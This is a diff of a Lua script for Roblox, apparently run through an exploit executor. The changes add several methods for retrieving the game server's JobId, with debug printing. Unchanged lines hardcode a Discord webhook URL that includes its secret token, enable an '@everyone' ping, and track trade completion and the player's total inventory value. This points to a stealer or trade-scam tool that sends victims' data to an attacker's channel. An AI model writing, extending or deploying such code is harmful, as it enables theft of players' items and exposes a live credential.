@@ -1,39 +1,115 @@
-local function getJobId()
-    local jobId = nil
-    
-    -- Try different methods
-    pcall(function() jobId = game.JobId end)
-    if jobId and jobId ~= "" then return jobId end
-    
-    pcall(function() jobId = game:GetJobId() end)
-    if jobId and jobId ~= "" then return jobId end
-    
-    pcall(function() 
-        local dm = game:GetService("DataModel")
-        jobId = dm.JobId 
-    end)
-    if jobId and jobId ~= "" then return jobId end
-    
-    -- Try to get from teleport service history
-    pcall(function()
-        local TeleportService = game:GetService("TeleportService")
-        if TeleportService.GetCurrentJobId then
-            jobId = TeleportService:GetCurrentJobId()
-        end
-    end)
-    if jobId and jobId ~= "" then return jobId end
-    
-    -- Generate a placeholder if all methods fail
-    return "UNKNOWN-" .. tostring(math.random(100000, 999999))
-end
-
-local JobId = getJobId()
-print(jobId)
-
 repeat task.wait() until game:IsLoaded()
 task.wait(2)
 
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
 
+-- DEBUG: Print all JobId retrieval attempts
+print("=== Starting JobId Debug ===")
+
+local JobId = "UNKNOWN"
+local methodUsed = "None"
+
+-- Method 1: Direct game.JobId
+local success1, result1 = pcall(function() 
+    return game.JobId 
+end)
+print("Method 1 (game.JobId):", success1, "Result:", result1)
+if success1 and result1 and result1 ~= "" then 
+    JobId = result1 
+    methodUsed = "game.JobId"
+end
+
+-- Method 2: game:GetJobId()
+if JobId == "UNKNOWN" then
+    local success2, result2 = pcall(function() 
+        return game:GetJobId() 
+    end)
+    print("Method 2 (game:GetJobId()):", success2, "Result:", result2)
+    if success2 and result2 and result2 ~= "" then 
+        JobId = result2 
+        methodUsed = "game:GetJobId()"
+    end
+end
+
+-- Method 3: DataModel
+if JobId == "UNKNOWN" then
+    local success3, result3 = pcall(function() 
+        local dm = game:GetService("DataModel")
+        return dm.JobId 
+    end)
+    print("Method 3 (DataModel.JobId):", success3, "Result:", result3)
+    if success3 and result3 and result3 ~= "" then 
+        JobId = result3 
+        methodUsed = "DataModel.JobId"
+    end
+end
+
+-- Method 4: TeleportService GetCurrentJobId
+if JobId == "UNKNOWN" then
+    local success4, result4 = pcall(function()
+        local ts = game:GetService("TeleportService")
+        if ts.GetCurrentJobId then
+            return ts:GetCurrentJobId()
+        end
+        return nil
+    end)
+    print("Method 4 (TeleportService.GetCurrentJobId):", success4, "Result:", result4)
+    if success4 and result4 and result4 ~= "" then 
+        JobId = result4 
+        methodUsed = "TeleportService"
+    end
+end
+
+-- Method 5: TeleportService GetPlayerPlaceInstanceAsync
+if JobId == "UNKNOWN" then
+    local success5, result5 = pcall(function()
+        local ts = game:GetService("TeleportService")
+        local plr = game:GetService("Players").LocalPlayer
+        local _, _, jobId = ts:GetPlayerPlaceInstanceAsync(plr.UserId)
+        return jobId
+    end)
+    print("Method 5 (GetPlayerPlaceInstanceAsync):", success5, "Result:", result5)
+    if success5 and result5 and result5 ~= "" then 
+        JobId = result5 
+        methodUsed = "GetPlayerPlaceInstanceAsync"
+    end
+end
+
+-- Method 6: Check if we're in a reserved server
+if JobId == "UNKNOWN" then
+    local success6, result6 = pcall(function()
+        return game.PrivateServerId
+    end)
+    print("Method 6 (PrivateServerId):", success6, "Result:", result6)
+end
+
+-- Method 7: InstanceId as alternative
+if JobId == "UNKNOWN" then
+    local success7, result7 = pcall(function()
+        return game.InstanceId
+    end)
+    print("Method 7 (InstanceId):", success7, "Result:", result7)
+    if success7 and result7 and result7 ~= "" and result7 ~= "0" then
+        -- InstanceId can sometimes be used as fallback
+        print("Note: InstanceId available but different from JobId")
+    end
+end
+
+-- Final result
+print("=== Final JobId Result ===")
+print("JobId:", JobId)
+print("Method Used:", methodUsed)
+print("Is UNKNOWN:", JobId == "UNKNOWN")
+
+-- If all methods failed, generate placeholder
+if JobId == "UNKNOWN" then
+    JobId = "BLOCKED-" .. tostring(math.random(100000, 999999))
+    print("Generated placeholder:", JobId)
+end
+
+-- Continue with rest of script...
 local cfg = (getgenv and getgenv()) or {}
 cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
 cfg.pingEveryone = "Yes"
@@ -46,9 +122,12 @@ local plr = Players.LocalPlayer
 
 if not plr then return end
 
+print("Player:", plr.Name, "PlaceId:", game.PlaceId, "JobId:", JobId)
+
 local isTradeCompleted = false
 local totalInventoryValue = 0
 
+-- ... rest of your script continues here with the embedded values database ...
 -- FIXED: Better request function detection with proper fallbacks
 local function findRequest()
     -- Check for specific executor functions first
